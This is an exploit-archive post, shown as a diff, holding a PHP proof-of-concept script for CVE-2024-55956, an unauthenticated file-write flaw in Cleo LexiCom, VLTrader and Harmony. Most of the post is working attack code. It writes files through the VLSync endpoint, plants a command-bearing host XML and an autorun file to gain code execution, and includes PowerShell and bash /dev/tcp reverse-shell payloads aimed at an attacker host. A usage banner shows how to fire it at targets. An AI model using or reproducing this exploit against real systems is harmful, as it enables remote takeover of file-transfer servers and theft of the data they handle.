@@ -1,0 +1,448 @@
+=============================================================================================================================================
+| # Title     : Cleo LexiCom VLTrader Harmony 5.8.0.23 Unauthenticated Arbitrary File Write                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.cleo.com/hc/en-us                                                                                               |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/188718/ &  CVE-2024-55956
+
+[+] Summary : 
+             Cleo LexiCom, VLTrader, and Harmony file transfer solutions versions 5.8.0.23 and below contain an unauthenticated remote code execution vulnerability 
+			 that allows attackers to write arbitrary files to the system and execute commands through the software's autorun functionality.
+			 The vulnerability exists in the VLSync synchronization endpoint that allows unauthenticated attackers to write arbitrary files to the filesystem. 
+			 By combining this with the software's autorun functionality, attackers can achieve remote code execution.
+[+]  POC : 
+
+php poc.php 
+
+<?php
+
+class CleoFileTransferRCE {
+    
+    private $target;
+    private $port;
+    private $ssl;
+    private $base_path;
+    
+    public function __construct($target, $port = 5080, $ssl = false, $base_path = '') {
+        $this->target = rtrim($target, '/');
+        $this->port = $port;
+        $this->ssl = $ssl;
+        $this->base_path = rtrim($base_path, '/');
+    }
+    
+    public function check() {
+        echo "[*] Checking Cleo LexiCom/VLTrader/Harmony vulnerability...\n";
+        
+        $url = $this->build_url('');
+        
+        $response = $this->send_request('GET', $url);
+        
+        if (!$response) {
+            return "Unknown: Connection failed";
+        }
+        
+        // Check for Cleo server header
+        if (isset($response['headers']['Server']) && 
+            preg_match('/cleo\s+(?:lexicom|vltrader|harmony)\/(\d+\.\d+\.\d+\.\d+)/i', $response['headers']['Server'], $matches)) {
+            
+            $version = $matches[1];
+            echo "[*] Detected version: {$version}\n";
+            
+            if (version_compare($version, '5.8.0.23', '<=')) {
+                return "Appears: Vulnerable " . $response['headers']['Server'];
+            } else {
+                return "Safe: Patched " . $response['headers']['Server'];
+            }
+        }
+        
+        return "Unknown: Not a Cleo product or version not detectable";
+    }
+    
+    public function exploit($payload_type, $payload_data) {
+        try {
+            echo "[*] Starting Cleo file transfer RCE exploitation...\n";
+            
+            // Check vulnerability first
+            $check_result = $this->check();
+            echo "[*] Vulnerability check: {$check_result}\n";
+            
+            if (strpos($check_result, 'Appears') === false) {
+                echo "[-] Target is not vulnerable, stopping exploitation\n";
+                return false;
+            }
+            
+            $jar_path = null;
+            $jar_content = null;
+            $command = null;
+            
+            // Determine payload type and prepare command
+            switch ($payload_type) {
+                case 'java':
+                    $jar_path = "temp/" . $this->random_string(8) . ".jar";
+                    $jar_content = $this->generate_java_payload($payload_data);
+                    $command = "jre/bin/java -jar \"{$jar_path}\"";
+                    break;
+                    
+                case 'windows':
+                    $command = "cmd.exe /c \"{$payload_data}\"";
+                    break;
+                    
+                case 'linux':
+                    $command = "/bin/sh -c \"{$payload_data}\"";
+                    break;
+                    
+                default:
+                    throw new Exception("Unsupported payload type: {$payload_type}");
+            }
+            
+            // Check for CDATA closing tag in command
+            if (strpos($command, ']]>') !== false) {
+                throw new Exception('Payload cannot contain the CDATA closing tag "]]>"');
+            }
+            
+            // Generate unique IDs
+            $host_guid = $this->generate_guid();
+            $mailbox_guid = $this->generate_guid();
+            $action_guid = $this->generate_guid();
+            
+            // Create host XML configuration
+            $host_xml = $this->create_host_xml($host_guid, $mailbox_guid, $action_guid, $command);
+            
+            // Create ZIP archive with host configuration
+            $zip_content = $this->create_zip_archive(['hosts/main.xml' => $host_xml]);
+            
+            $zip_path = "temp/" . $this->random_string(8) . ".zip";
+            
+            // Write ZIP file to target
+            echo "[*] Writing host configuration ZIP...\n";
+            $this->arbitrary_file_write($zip_path, $zip_content);
+            
+            // Write JAR file for Java payloads
+            if ($jar_content && $jar_path) {
+                echo "[*] Writing Java payload JAR...\n";
+                $this->arbitrary_file_write($jar_path, $jar_content);
+            }
+            
+            // Create autorun file to install and execute
+            $autorun_data = "-i \"{$zip_path}\"\r\n-r \"<{$action_guid}>{$mailbox_guid}@{$host_guid}\"";
+            $autorun_path = "autorun/" . $this->random_string(8);
+            
+            echo "[*] Writing autorun configuration...\n";
+            $this->arbitrary_file_write($autorun_path, $autorun_data);
+            
+            echo "[+] Exploitation completed successfully\n";
+            echo "[*] Payload should execute shortly (waiting up to 10 seconds)...\n";
+            
+            // Wait for execution
+            sleep(10);
+            
+            return true;
+            
+        } catch (Exception $e) {
+            echo "[-] Exploitation failed: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    private function create_host_xml($host_guid, $mailbox_guid, $action_guid, $command) {
+        return '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Host alias="' . $host_guid . '" application="" by="Administrator" class="*CwwQNwwbER4SEhA8Ex4cEDNRQQwRBwsbGk5TEQdOEAUWTkM*" created="2020/10/10 00:00:00" enabled="True" enc="' . $this->generate_guid() . '" local="True" modevent="Modified" modified="2020/10/10 00:00:00" moditem="&lt;copy&gt;myCommands@Local Commands" modtype="Actions" preconfigured="2009/10/30 15:15" ready="True" standaloneaction="False" test="False" transport="" type="" uid="' . $this->generate_guid() . '" version="1">
+  <Connecttype>0</Connecttype>
+  <Inbox>inbox\</Inbox>
+  <Index>0</Index>
+  <Indexdate>-1</Indexdate>
+  <Internal>0</Internal>
+  <Notes>This contains mailboxes for a local host which can be used for local commands only.</Notes>
+  <Origin>Local Commands</Origin>
+  <Outbox>outbox\</Outbox>
+  <Port>0</Port>
+  <Runninglocalrequired>True</Runninglocalrequired>
+  <Secureportrequired>False</Secureportrequired>
+  <Uidswpd>True</Uidswpd>
+  <Advanced>ZipCompressionLevel=System Default</Advanced>
+  <Advanced>XMLEncryptionAlgorithm=System Default</Advanced>
+  <Advanced>HighPriorityIncomingWeight=10</Advanced>
+  <Advanced>PGPHashAlgorithm=System Default</Advanced>
+  <Advanced>HighPriorityOutgoingWeight=10</Advanced>
+  <Advanced>PGPCompressionAlgorithm=System Default</Advanced>
+  <Advanced>OutboxSort=System Default</Advanced>
+  <Advanced>PGPEncryptionAlgorithm=System Default</Advanced>
+  <Mailbox alias="' . $mailbox_guid . '" class="*BxAdExYeMgwbER4SEhA8Ex4cEDNR" created="2020/10/10 00:00:00" enabled="True" localdecryptcert="" localencryptcert="" localpackaging="None" partnerdecryptcert="" partnerdecryptpassword="" partnerencryptcert="" partnerpackaging="None" ready="True" uid="' . $this->generate_guid() . '" version="1">
+    <Action actiontype="Commands" alias="' . $action_guid . '" by="Administrator" class="*ERAWCxw+DBsRHhISEDwTHhwQM1E*" created="2020/10/10 00:00:00" enabled="True" modified="2020/10/10 00:00:00" ready="True" uid="' . $this->generate_guid() . '" version="2">
+      <Autostartup>False</Autostartup>
+      <Commands><![CDATA[SYSTEM ' . $command . ']]></Commands>
+      <Filesin>0</Filesin>
+      <Filesout>0</Filesout>
+      <Ssl>False</Ssl>
+    </Action>
+  </Mailbox>
+</Host>';
+    }
+    
+    private function arbitrary_file_write($path, $data) {
+        $boundary = $this->random_string(16);
+        
+        // Randomly choose between commands
+        $multipart_vlsync_command = ['ReceivedReceipt', 'SentReceipt'][rand(0, 1)];
+        
+        // Shuffle parameters
+        $params = [
+            'service="AS2"',
+            'msgId=' . $this->random_string(8),
+            'path="' . $path . '"',
+            'receiptfolder=Unspecified'
+        ];
+        shuffle($params);
+        $multipart_vlsync_params = implode(';', $params);
+        
+        $content_data = "VLSync: {$multipart_vlsync_command};{$multipart_vlsync_params}\r\n";
+        $content_data .= "{$boundary}\r\n";
+        $content_data .= $data;
+        
+        $url = $this->build_url('Synchronization');
+        
+        $headers = [
+            'VLSync: Multipart;l=0,Acknowledge'
+        ];
+        
+        $response = $this->send_request('POST', $url, $content_data, [
+            'Content-Type: application/form-data; boundary=' . $boundary
+        ]);
+        
+        if (!$response || $response['code'] != 200) {
+            throw new Exception("Failed to write file to: {$path}");
+        }
+        
+        echo "[+] Successfully wrote file: {$path}\n";
+    }
+    
+    private function generate_java_payload($payload_class) {
+        // This is a simplified Java JAR generator
+        // In a real scenario, you would generate a proper Java payload
+        $manifest = "Manifest-Version: 1.0\nMain-Class: {$payload_class}\n";
+        
+        // Create a simple JAR structure
+        $jar_content = $this->create_zip_archive([
+            'META-INF/MANIFEST.MF' => $manifest,
+            "{$payload_class}.class" => $this->generate_dummy_class($payload_class)
+        ]);
+        
+        return $jar_content;
+    }
+    
+    private function generate_dummy_class($class_name) {
+        // Generate a simple Java class file placeholder
+        // In reality, this would be a proper compiled Java class
+        return "// Placeholder for {$class_name}.class\n// Actual payload would be a compiled Java class";
+    }
+    
+    private function create_zip_archive($files) {
+        $zip = new ZipArchive();
+        $temp_file = tempnam(sys_get_temp_dir(), 'cleo_');
+        
+        if ($zip->open($temp_file, ZipArchive::CREATE) !== TRUE) {
+            throw new Exception("Cannot create ZIP archive");
+        }
+        
+        foreach ($files as $path => $content) {
+            $zip->addFromString($path, $content);
+        }
+        
+        $zip->close();
+        
+        $zip_content = file_get_contents($temp_file);
+        unlink($temp_file);
+        
+        return $zip_content;
+    }
+    
+    private function send_request($method, $url, $data = null, $custom_headers = []) {
+        $ch = curl_init();
+        
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_HEADER => true,
+            CURLOPT_CUSTOMREQUEST => $method,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]);
+        
+        if ($data !== null) {
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        }
+        
+        if (!empty($custom_headers)) {
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $custom_headers);
+        }
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        
+        if (curl_error($ch)) {
+            curl_close($ch);
+            return null;
+        }
+        
+        curl_close($ch);
+        
+        // Parse headers and body
+        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+        $headers = substr($response, 0, $header_size);
+        $body = substr($response, $header_size);
+        
+        $parsed_headers = [];
+        foreach (explode("\r\n", $headers) as $header) {
+            if (strpos($header, ':') !== false) {
+                list($key, $value) = explode(':', $header, 2);
+                $parsed_headers[trim($key)] = trim($value);
+            }
+        }
+        
+        return [
+            'code' => $http_code,
+            'headers' => $parsed_headers,
+            'body' => $body
+        ];
+    }
+    
+    private function build_url($path) {
+        $protocol = $this->ssl ? 'https' : 'http';
+        $base_url = "{$protocol}://{$this->target}:{$this->port}";
+        
+        if ($this->base_path) {
+            $base_url .= '/' . ltrim($this->base_path, '/');
+        }
+        
+        if ($path) {
+            $base_url .= '/' . ltrim($path, '/');
+        }
+        
+        return $base_url;
+    }
+    
+    private function generate_guid() {
+        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
+            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
+            mt_rand(0, 0xffff),
+            mt_rand(0, 0x0fff) | 0x4000,
+            mt_rand(0, 0x3fff) | 0x8000,
+            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
+        );
+    }
+    
+    private function random_string($length) {
+        $chars = 'abcdefghijklmnopqrstuvwxyz';
+        $result = '';
+        for ($i = 0; $i < $length; $i++) {
+            $result .= $chars[random_int(0, strlen($chars) - 1)];
+        }
+        return $result;
+    }
+}
+
+// Payload generators for different platforms
+class CleoPayloadGenerator {
+    
+    public static function generate_windows_reverse_shell($lhost, $lport) {
+        return "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('{$lhost}',{$lport});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"";
+    }
+    
+    public static function generate_linux_reverse_shell($lhost, $lport) {
+        return "bash -i >& /dev/tcp/{$lhost}/{$lport} 0>&1";
+    }
+    
+    public static function generate_windows_cmd($command) {
+        return $command;
+    }
+    
+    public static function generate_linux_cmd($command) {
+        return $command;
+    }
+    
+    public static function generate_java_payload_class() {
+        return "ReverseShell";
+    }
+}
+
+// Command line interface
+if (php_sapi_name() === 'cli' && isset($argv[0]) && basename($argv[0]) === basename(__FILE__)) {
+    
+    if ($argc < 3) {
+        echo "Cleo LexiCom/VLTrader/Harmony Unauthenticated RCE (CVE-2024-55956)\n";
+        echo "===================================================================\n";
+        echo "Usage: php " . $argv[0] . " <target> <payload_type> [options]\n";
+        echo "Example: php " . $argv[0] . " 192.168.1.100 windows\n";
+        echo "Example: php " . $argv[0] . " 192.168.1.100 linux\n";
+        echo "Example: php " . $argv[0] . " 192.168.1.100 java\n";
+        echo "\nPayload options (environment variables):\n";
+        echo "For windows/linux: LHOST=192.168.1.50 LPORT=4444\n";
+        echo "For custom commands: CMD='whoami'\n";
+        echo "\nAdditional options:\n";
+        echo "PORT=5080 SSL=false BASE_PATH=''\n";
+        exit(1);
+    }
+    
+    $target = $argv[1];
+    $payload_type = $argv[2];
+    
+    // Parse environment variables
+    $port = getenv('PORT') ?: 5080;
+    $ssl = getenv('SSL') === 'true';
+    $base_path = getenv('BASE_PATH') ?: '';
+    $lhost = getenv('LHOST') ?: 'ATTACKER_IP';
+    $lport = getenv('LPORT') ?: '4444';
+    $custom_cmd = getenv('CMD') ?: 'whoami';
+    
+    try {
+        echo "[*] Initializing Cleo file transfer RCE exploit...\n";
+        echo "[*] Target: {$target}:{$port}\n";
+        echo "[*] Payload type: {$payload_type}\n";
+        
+        $exploit = new CleoFileTransferRCE($target, $port, $ssl, $base_path);
+        
+        // Generate payload based on type
+        $payload_data = match($payload_type) {
+            'windows' => $lhost !== 'ATTACKER_IP' 
+                ? CleoPayloadGenerator::generate_windows_reverse_shell($lhost, $lport)
+                : CleoPayloadGenerator::generate_windows_cmd($custom_cmd),
+            'linux' => $lhost !== 'ATTACKER_IP'
+                ? CleoPayloadGenerator::generate_linux_reverse_shell($lhost, $lport)
+                : CleoPayloadGenerator::generate_linux_cmd($custom_cmd),
+            'java' => CleoPayloadGenerator::generate_java_payload_class(),
+            default => throw new Exception("Unsupported payload type: {$payload_type}")
+        };
+        
+        if ($payload_type === 'windows' || $payload_type === 'linux') {
+            if ($lhost !== 'ATTACKER_IP') {
+                echo "[*] Using reverse shell: {$lhost}:{$lport}\n";
+            } else {
+                echo "[*] Using custom command: {$custom_cmd}\n";
+            }
+        }
+        
+        // Execute exploit
+        $success = $exploit->exploit($payload_type, $payload_data);
+        
+        if ($success) {
+            echo "[+] Exploitation completed!\n";
+            echo "[*] Note: This exploit works against Cleo LexiCom/VLTrader/Harmony <= 5.8.0.23\n";
+        }
+        
+    } catch (Exception $e) {
+        echo "[-] Exploitation failed: " . $e->getMessage() . "\n";
+        exit(1);
+    }
+}
+
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
